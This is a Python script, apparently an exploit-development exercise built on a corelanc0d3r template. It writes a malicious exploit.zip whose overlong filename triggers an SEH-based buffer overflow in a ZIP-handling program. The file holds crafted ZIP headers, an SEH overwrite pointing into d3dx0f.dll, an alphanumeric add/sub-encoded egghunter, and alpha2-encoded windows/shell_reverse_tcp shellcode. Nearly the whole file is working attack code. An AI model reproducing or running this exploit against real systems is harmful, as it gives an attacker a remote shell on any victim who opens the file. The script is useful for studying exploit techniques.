#!/usr/bin/env python

'''
thanx to corelanc0d3r and d3c3pt10n for exploit template and guidance!

this is a variation of theirs, simplified by using EDI as buffered reg
to locate shellcode, pointed to by an add/sub encoded egghunter

'''


from os import remove
from sys import exit

filename = "exploit.zip"
target_len = 4068

ldf_header = (
    "\x50\x4B\x03\x04\x14\x00\x00"
    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"
    "\x00\x00\x00"
)

cdf_header = (
    "\x50\x4B\x01\x02\x14\x00\x14"
    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"
    "\x00\x00\x00\x00\x00\x00\x01\x00"
    "\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    "\x12\x10\x00\x00"
    "\x02\x10\x00\x00"
    "\x00\x00"
)



#nseh = "\x42\x42\x42\x42"
nseh = "\x74\x0e\x47\x47"
seh = "\x65\x2d\x7e\x6d"  #6D7E2D65, d3dx0f.dll
file_extension = ".txt"

payload = "\x47" * 291


#make sure ESP points to area we want payload to decode to:
egghunter = ""
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x54"
egghunter += "\x58"
egghunter += "\x2d\x58\x76\x76\x76"
egghunter += "\x2d\x39\x50\x58\x58"
egghunter += "\x2d\x33\x32\x31\x31"
egghunter += "\x50"
egghunter += "\x5c"

#now here is the rest

egghunter += "\x25\x4A\x4D\x4E\x55"
egghunter += "\x25\x35\x32\x31\x2A"
egghunter += "\x2d\x30\x78\x78\x78"
egghunter += "\x2d\x36\x4a\x54\x4a"
egghunter += "\x2d\x25\x56\x33\x55"
egghunter += "\x50"

egghunter += "\x2d\x61\x61\x61\x61"
egghunter += "\x2d\x77\x61\x61\x61"
egghunter += "\x2d\x77\x61\x2d\x45"
egghunter += "\x2d\x77\x4d\x25\x30"
egghunter += "\x50"

egghunter += "\x2d\x25\x36\x76\x36"
egghunter += "\x2d\x25\x76\x76\x36"
egghunter += "\x2d\x35\x55\x72\x48"
egghunter += "\x50"

egghunter += "\x2d\x70\x39\x39\x39"
egghunter += "\x2d\x70\x39\x70\x39"
egghunter += "\x2d\x61\x48\x6a\x57"
egghunter += "\x50"

egghunter += "\x2d\x4a\x4a\x6c\x71"
egghunter += "\x2d\x25\x25\x6c\x25"
egghunter += "\x2d\x44\x44\x45\x25"
egghunter += "\x50"

egghunter += "\x2d\x65\x31\x31\x65"
egghunter += "\x2d\x65\x31\x25\x76"
egghunter += "\x2d\x70\x4a\x36\x6a"
egghunter += "\x50"

egghunter += "\x2d\x68\x68\x30\x68"
egghunter += "\x2d\x45\x68\x25\x37"
egghunter += "\x2d\x46\x45\x25\x25"
egghunter += "\x50"

egghunter += "\x2d\x47\x7a\x57\x35"
egghunter += "\x2d\x62\x46\x30\x35"
egghunter += "\x50"

egg = "w00tw00t"

# windows/shell_reverse_tcp encoded with alpha2 with EDI buffered reg
buf = "WYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLKXK2UPC0UP50K9JEP1YPCTLK0PP0LKPR4LLKPRUDLKSBVHTONW0JQ66QKONLWL3QSLC2FL7PO18O4MC1O7JBL2PRPWLKQBB0LKPJGLLK0LDQT8KSW8EQXQPQLKPYWPUQ9CLK1YTXM36ZW9LKFTLKUQN601KONLYQXODMS1O76XKPD5ZVUSCMJXGKSM6DRUM41HLKF8GTUQXSRFLKTLPKLKPX5LC1N3LK34LKUQN0MYG4WT7TQKQKSQPY1J0QKOKPQOQO1JLKR2ZKLMQMU8P3P230UPU8BWT3P2QOF458PLRW7VS7KON5NXLP31S0UPVIYTPTPPE8WYMPRK30KOIEV0PPPPPPQPPPQP0P58JJ4OIOM0KO9ELWSZUUU8O0Y8P8U6SXS2C0PUSYMYKVRJB01F0WSXLYOU2TSQKOYEMU9P44TLKO0NS845ZL58JP85NB1FKO8UE8SSBMBD5PLIM3PWPWPW6QJV2JUBPYPVKRKMRFYWQTVD7LUQEQLM1T14B09VUPPDQDV0F6PVPV0F1FPN66F6F30VCXRY8LGOMVKOXULIKPPNV6PFKO00U85XK7UM3PKO9EOKZPNUNBQFSXI6LUOMMMKON5WL5V3LUZMPKKM0RUUUOKPGUCT2ROSZ5PPSKOYEA"

payload += nseh
payload += seh
payload += "G" * 16
payload += egghunter
payload += "G" * 150
payload += egg + buf
payload += "G" * (4068 - len(payload) - len(file_extension))
payload += file_extension



with open(filename, "w") as f:
    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
    f.write(file_content)
